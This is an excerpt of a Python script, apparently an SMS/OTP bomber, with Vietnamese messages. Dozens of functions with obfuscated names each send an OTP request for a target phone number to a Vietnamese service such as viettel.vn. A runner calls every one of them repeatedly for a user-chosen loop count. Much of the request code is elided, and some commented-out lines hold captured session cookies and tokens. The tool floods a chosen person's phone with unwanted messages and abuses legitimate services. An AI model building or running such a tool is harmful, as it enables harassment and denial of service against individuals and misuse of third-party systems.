...
def S2S22SS22SSSSSSSSS2SS(sdt):
    cookies = {
        ...
        'XSRF-TOKEN': '%3D',
    ...
    headers = {
        ...
        # 'Cookie': 'SERVER=nginx2; _gcl_au=1.1.481698065.1722327865; _tt_enable_cookie=1; _ttp=sCpx7m_MUB9D7tZklNI1kEjX_05; _gid=GA1.2.1931976026.1722327868; _ga_CEMYNHNKQ2=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_8DLTVS911W=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_R7XKMTVGEW=GS1.1.1722327866.1.1.1722327876.50.0.0; _ga=GA1.2.535777579.1722327867; XSRF-TOKEN=%3D; medicare_session=%3D',
        ...
        'X-XSRF-TOKEN': '',
...
def ODoOODODDOOOOOODDoDDOO(sdt):
    cookies = {
        ...
        'utm_uid': '%3D',
...
def jijjlljjjijjiiijjiilii(sdt):
    ...
    headers = {
        ...
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE9ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
...
def MMNNNMMMMMNNNNNNMNNNMMM(sdt):
    ...
    'sessionid': '%3D',
...
def SS22SSSS22222S2SS2S2S(sdt):
    ...
    headers = {
        ...
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=
    }

    print("OTP SEND:", response.text)

# Thêm hàm chạy tất cả các service
def run_all_services(sdt, loop_count):
    all_functions = [
        XWXWWWXWWWXXXXXXWW, lIlIlllllllIllIlI, S2S22SS22SSSSSSSSS2SS, OODOOooDoOOoOoOooDD,
        JIILIILJJILJJILJIILLJILI, S222SSSSSS222S2SS2SS22222S, lIIllIlllIIllIIlIllI,
        DOOOOoDDDOODDDDoDooO, llIllIIIIlIlIIlIlIlll, NMMNNNMMNMMMMNNNM, XWWWWXWXWXXXXXXWXXW,
        MNMNNNMNMNMNNNMMNNMN, OO00OoO0o0Oo0ooOOo0OOO0o, Oo0oO0ooooo0O000O0ooO, LJIJIILJJJLIJLJJILJ,
        IlIIIlIlllIlIIlIlIllI, IlIIlllIIlIIIIlIIllIll, ODoOODODDOOOOOODDoDDOO, XXWXWWWXXXXXXWXXXWXXX,
        OOoO0O0OO000Oo00OooO0O0o, xwxwxxxxwwxxwwxwxwxxwxx, JLJLLIJJLJLJIIIIJLLLJJJJL,
        oOOoDDDDoOoDoOoooO, lIlIIIIIIIIlIlIIlllI, XWWWWXWXXWXXXXXXWXW, O00oOoOo0O0Oo0OO00OO0,
        WWWWWWXWXWXWXXWWW, xxwxxxxxxxxwwwxwwwxxxxwx, IllIIlIIIlIIlIIlIlI, xxwwwxwwwwxwxwwxxx,
        LJJLIILLLILIJIJLLJL, WXWWWWXWXWXXWWXWWWXWXXXX, DOoODDDDOOoDooOODDODDDO,
        xwwwwxxxwxwwwxxwxxwxwwx, IIIIIIlIIIlIIIIlIllIIIlII, lljjjjliiiljijljli,
        liljliiiijijljljl, O0O0OOoOoO0oOoOOOOoo0oOOO0, NMNMMMMNMNMNMMNMNN, DOooOoOOOODoODoooDO,
        S22SSS2SSSS22222SSS22, IIIIllllIllIIIIllIIIllI, mmnmmmnmmmmmmmnmmnnmnnmm,
        IIllIllIlllIlllII, mmnnmnmnnmmmnnmnmmmmm, lIIlllIIIllIIIlIIIIIll, jijjlljjjijjiiijjiilii,
        WWWXXXWWXXXWWWXWWXWXW, XXWWXWWWXXWXWXXXXXW, IJIILJILJLLLJJLLJLJILII, SS2S22SSSS2S2SS22SSS,
        mmnmnnmnnnmmmnmmmnmnnmm, MMNNNMMMMMNNNNNNMNNNMMM, MMNMMMMMMNNMNMMNNMMM,
        jljijilllljjlijjjll, WXXXXWXWWWXWWWXXWXWXXXXXX, MMNMMNMMMNNMNNNMNNN, WWXXWWXWWXXWWXWWWWW,
        IILLILJLLLJLIJIJJ, jijiijjijllijijji, WXWWXWXWWWWWXXWWXXWXW, jjljjljjilijijjiljljjiil,
        OOooDOOoOODOOOoDOoOo, ljlljjlljiiiljljjlij, SS22SSSS22222S2SS2S2S
    ]
    
    for i in range(loop_count):
        print(f"\n{Fore.GREEN}=== LẦN LẶP THỨ {i+1}/{loop_count} ==={Style.RESET_ALL}")
        ...
        if i < loop_count - 1:
            print(f"{Fore.YELLOW}\nĐang chờ 2 giây trước khi chạy lần tiếp theo...{Style.RESET_ALL}")
            time.sleep(2)

# Phần xử lý tham số dòng lệnh
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"{Fore.RED}Sử dụng: python {sys.argv[0]} <số_điện_thoại> <số_lần_lặp>{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Ví dụ: python {sys.argv[0]} 0987654321 10{Style.RESET_ALL}")
        sys.exit(1)
    ...
    try:
        ...
        print(f"{Fore.RED}Lỗi: Số lần lặp phải là số nguyên!{Style.RESET_ALL}")
        sys.exit(1)
    
    # Kiểm tra số điện thoại hợp lệ (đơn giản)
    if not sdt.isdigit() or len(sdt) < 9:
        print(f"{Fore.RED}Cảnh báo: Số điện thoại '{sdt}' có thể không hợp lệ!{Style.RESET_ALL}")
        user_input = input(f"{Fore.YELLOW}Bạn có muốn tiếp tục không? (y/n): {Style.RESET_ALL}")
        if user_input.lower() != 'y':
            sys.exit(0)
    
    print(f"{Fore.CYAN}Đang chạy với số điện thoại: {sdt}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Số lần lặp: {loop_count}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Đang bắt đầu...{Style.RESET_ALL}")
    
    # Chạy tất cả các service
    run_all_services(sdt, loop_count)
    
    print(f"{Fore.GREEN}\nHoàn thành!{Style.RESET_ALL}")